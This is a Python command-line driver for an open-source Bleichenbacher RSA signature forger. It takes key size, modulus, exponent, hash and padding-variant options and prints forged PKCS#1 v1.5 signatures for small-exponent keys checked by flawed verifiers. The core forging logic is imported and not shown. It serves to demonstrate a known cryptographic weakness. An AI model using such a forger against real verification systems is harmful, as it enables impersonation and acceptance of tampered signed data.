#!/usr/bin/python

"""
This file is part of Bleichenbacher Signature Forger v2.0.

Copyright 2016 Filippo Valsorda
Copyright 2017 Peter Hoeg Steffensen
Copyright 2021 Maxim Masiutin

History:

1.0 (July 2nd, 2017)
  - Initial version

2.0 (May 5th, 2021)
  - Ported to Python 3. Removed strings in favor of byte objects
  - Added support for output formats
  - Added support for modulus and public exponent command line parameters. The modulus can be specified instead of the key size
  - Dynamic precision adjustment for larger numbers
  - The program exits with an appropriate message if it cannot generate a signature, rather than spinning in an endless loop
  - The option to specify the number of FF's
  - The "quiet" option
  - All error messages are printed to stderr


Bleichenbacher Signature Forger is free software: you can redistribute it and/or modify
it under the terms of the GNU General Public License as published by
the Free Software Foundation, either version 3 of the License, or
(at your option) any later version.

Bleichenbacher Signature Forger is distributed in the hope that it will be useful,
but WITHOUT ANY WARRANTY; without even the implied warranty of
MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
GNU General Public License for more details.

You should have received a copy of the GNU General Public License
along with Bleichenbacher Signature Forger.  If not, see <https://www.gnu.org/licenses/>.
"""

from argparse import ArgumentParser
from sys import stdout, stderr, argv, exit
from HashInfo import HASH_ASN1
from SignatureForger import SignatureForger, toInt
from base64 import b64encode
from binascii import hexlify

DefaultPublicExponent = 3
DefaultFFcount = 1
DefaultQuiet = False


def printOutput(arg_signature, arg_format, arg_quiet):

    if not arg_quiet:
        print("****************************************************")
        print("*         Signature successfully generated!        *")
        print("****************************************************")
        print("")
        print("Signature:")

    binary_data = None
    if arg_format == "base64":
        binary_data = b64encode(arg_signature)
    elif arg_format == "hex":
        binary_data = hexlify(arg_signature)
    elif arg_format == "raw":
        stdout.buffer.write(arg_signature)
    elif arg_format == "decimal":
        print(toInt(arg_signature))
    else:
        print("Unknown output format specified " + arg_format, file=stderr)

    if binary_data is not None:
        print(binary_data.decode("ascii"))


def getArguments():
    parser = ArgumentParser(
        description="Bleichenbacher Signature Forger. "
        + "Version 2.0. "
        + "This program demonstrates the vulenrability of the RSA PKCS1v1.5 and the attack when public exponent is small (e.g., 3) and the verification algorithm is not implemented properly."
    )

    parser.add_argument("-k", "--keysize", type=int)
    parser.add_argument(
        "-ha", "--hashalg", action="store", type=str, choices=list(HASH_ASN1.keys())
    )
    parser.add_argument(
        "-va",
        "--variant",
        type=int,
        choices=[1, 2],
        help="1 - 00 01 FF ... 00 ASN.1 HASH ZeroGarbage;  2 - 00 01 FF RandomNonzeroGarbage 00 ASN.1 HASH",
    )
    parser.add_argument(
        "-of", "--outputformat", type=str, choices=["decimal", "hex", "base64", "raw"]
    )
    parser.add_argument("-m", "--message", type=str)
    parser.add_argument(
        "-e", "--public-exponent", type=int, default=DefaultPublicExponent
    )
    parser.add_argument("-N", "--modulus", type=int)
    parser.add_argument("-F", "--ffcount", type=int, default=DefaultFFcount)
    parser.add_argument("-q", "--quiet", action="store_true")

    ret_args = parser.parse_args()

    if len(argv) == 1:
        parser.print_help(stderr)
        exit(1)

    return ret_args


args = getArguments()

quiet = args.quiet

if quiet is None:
    quiet = DefaultQuiet

keySize = args.keysize
hashAlg = args.hashalg
ffcount = args.ffcount
if ffcount is None:
    ffcount = DefaultFFcount

public_exponent = args.public_exponent
if public_exponent is None:
    public_exponent = DefaultPublicExponent

modulus = args.modulus

if (modulus is not None) and (keySize is not None):
    modulus_bits = modulus.bit_length()
    if modulus_bits > keySize:
        print(
            "You have specified modulus of",
            modulus_bits,
            "bits and the key size of",
            keySize,
            "bits which is smaller!",
            file=stderr,
        )
        exit(1)

    dif = keySize - modulus_bits
    if dif > 16:
        print(
            "You have specified modulus of",
            modulus_bits,
            "bits and the key size of",
            keySize,
            "bits. Therefore, the modulus is",
            dif,
            "bits smaller than the key size, while the maximum tolerable difference is 16 bits",
            file=stderr,
        )
        exit(1)

if (modulus is not None) and (keySize is None):
    keySize = modulus.bit_length()

if public_exponent is None:
    public_exponent = DefaultPublicExponent

if keySize is None:
    print("Please specify the key size and/or the modulus", file=stderr)
    exit(1)

signatureForger = SignatureForger(
    keySize, hashAlg, modulus, public_exponent, ffcount, quiet
)

signature = None

if args.variant == 1:
    signature = signatureForger.forgeSignature_method_garbage_end(args.message)
elif args.variant == 2:
    signature = signatureForger.forgeSignature_method_garbage_mid(args.message)
else:
    print("Unsupported signature method", file=stderr)
    exit(1)

of = args.outputformat
if of is None:
    of = "base64"
if signature is None:
    print("Cannot generate the signature.", end="", file=stderr)
    if (public_exponent <= 3) and (keySize < 4096):
        print(" (Key size is too small?)", end="", file=stderr)
    print("", file=stderr)
    exit(2)
else:
    printOutput(signature, of, quiet)
